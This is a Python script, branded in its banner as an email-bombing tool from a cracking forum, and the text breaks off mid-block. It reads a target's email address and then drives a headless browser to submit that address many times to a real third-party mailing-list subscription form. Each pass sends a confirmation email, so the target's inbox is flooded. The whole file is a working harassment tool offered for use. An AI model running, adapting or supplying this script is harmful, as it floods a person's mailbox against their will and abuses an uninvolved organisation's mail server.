import os
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import time


os.system('cls')
class bcolors:
    Black        = '\033[30m'
    Redd         = "\033[31m"
    Greenn        = "\033[32m"
    Yelloww       = "\033[33m"
    Blue         = "\033[34m"
    Magenta      = "\033[35m"
    Cyan         = "\033[36m"
    LightGray    = "\033[37m"
    DarkGray     = "\033[90m"
    LightRed     = "\033[91m"
    LightGreen   = "\033[92m"
    LightYellow  = "\033[93m"
    LightBlue    = "\033[94m"
    LightMagenta = "\033[95m"
    LightCyan    = "\033[96m"
    White        = "\033[97m"


options = Options()
options.add_argument('--headless')
options.add_argument('--disable-gpu')

filenames = ["tank1.txt", "tank2.txt", "tank3.txt", "tank4.txt"]
frames = []

for name in filenames:
    with open(name, "r" ,encoding="utf8") as f:
        frames.append(f.readlines())

for frame in frames:
    print("".join(frame))
    time.sleep(1)
    os.system('cls')

print(bcolors.Redd + """

██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██╗██╗  ██╗ ██████╗ ███╗   ██╗ ██████╗ 
██╔══██╗██╔═══██╗████╗ ████║██╔══██╗╚══███╔╝██║██║ ██╔╝██╔═══██╗████╗  ██║██╔════╝       ,--.!,
██████╔╝██║   ██║██╔████╔██║██████╔╝  ███╔╝ ██║█████╔╝ ██║   ██║██╔██╗ ██║██║  ███╗   __/   -*-
██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗ ███╔╝  ██║██╔═██╗ ██║   ██║██║╚██╗██║██║   ██║ ,d08b.  '|`
██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║██║  ██╗╚██████╔╝██║ ╚████║╚██████╔╝ 0088MM
╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝  `9MMP' 
                                                                                          `BombZiKong a tool known for E-MAIL bombing  
                                                                                   
This tool was made by https://cracked.to/ANG for Cracked.to
                                                                           
""")

num = input('\033[96mHow fast is your internet speed so it wont crash? (safe = 2 : ')

username = input('\033[92mEnter the email you want to bomb: ')
print("bombing:")
print(username)
browser = webdriver.Chrome(options=options)
browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")

#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
